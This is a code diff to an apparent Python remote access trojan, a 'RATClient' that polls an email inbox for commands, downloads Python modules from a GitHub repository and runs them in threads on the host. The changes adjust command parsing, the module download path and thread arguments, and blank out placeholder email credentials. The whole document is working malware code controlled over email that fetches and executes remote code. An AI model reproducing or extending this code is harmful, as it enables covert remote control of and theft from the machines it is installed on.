@@ -14,7 +14,7 @@ from email.mime.base import MIMEBase
 from email.header import decode_header
 
 # Externals
-from externals.templates import create_html_content, shell,systeminfo_template
+from externals.templates import create_html_content, shell,systeminfo_template,helper_template
 from externals.useless import basic_systeminfo
 
 class EmailHandler:
@@ -115,6 +115,8 @@ class CommandHandler:
                 from_email = from_email.decode(encoding or "utf-8")
             print("!New Message Received")
             body = self.get_email_body(msg)
+            if '\r' in body:
+                body = body.replace("\r","")
             print(f"Body: {[body]}")
             self.handle_command(body)
             return True
@@ -131,7 +133,8 @@ class CommandHandler:
         return os.path.exists(mod_path)
 
     def download_module(self, mod_name):
-        mod_url = f"{self.github_repo_url}/raw/unstable/mods/{mod_name}.py"
+        mod_url = f"{self.github_repo_url}/raw/unstable/bot/mods/{mod_name}.py"
+        print("Mod Url: ",mod_url)
         response = requests.get(mod_url)
         if response.status_code == 200:
             mod_path = os.path.join(self.temp_dir, f"{mod_name}.py")
@@ -143,8 +146,10 @@ class CommandHandler:
 
     def handle_command(self, command):
         if command.startswith(":"):
-            cmd_parts = command.split()
-            mod_name = cmd_parts[0][1:]  # Remove the leading ':'
+            #print("Command",command)
+            cmd_parts = command.split(',')
+            mod_name = cmd_parts[0][1:].strip()  # Remove the leading ':'
+            print("Mod Name",cmd_parts)
             args = cmd_parts[1:]
             print(args)
             try:
@@ -161,9 +166,9 @@ class CommandHandler:
                 # Run the module in a separate thread
                 mod_class = getattr(mod, mod_name)
                 if args == []:
-                    thread = threading.Thread(target=mod_class().run, args=(self.msgId,self.email_handler))
+                    thread = threading.Thread(target=mod_class().run, args=(self.email_handler,self.msgId))
                 else:
-                    thread = threading.Thread(target=mod_class().run, args=(args, self.email_handler, self.msgId))
+                    thread = threading.Thread(target=mod_class().run, args=(args),kwargs={'EmailHandler':self.email_handler,"msgId":self.msgId})
                 thread.start()
             except ModuleNotFoundError as e:
                 self.email_handler.send_email(f"{e}")
@@ -205,9 +210,9 @@ class RATClient:
             self.email_handler.logout_imap()
 
 if __name__ == "__main__":
-    USERNAME = "###USERNAME"
-    PASSWORD = "###PASSWORD"
-    YOUR_MAIL = "###YOURMAIL"
+    USERNAME = ""
+    PASSWORD = ""
+    YOUR_MAIL = ""
     IDLE_INTERVAL = 60
 
     client = RATClient(USERNAME, PASSWORD, YOUR_MAIL, IDLE_INTERVAL)
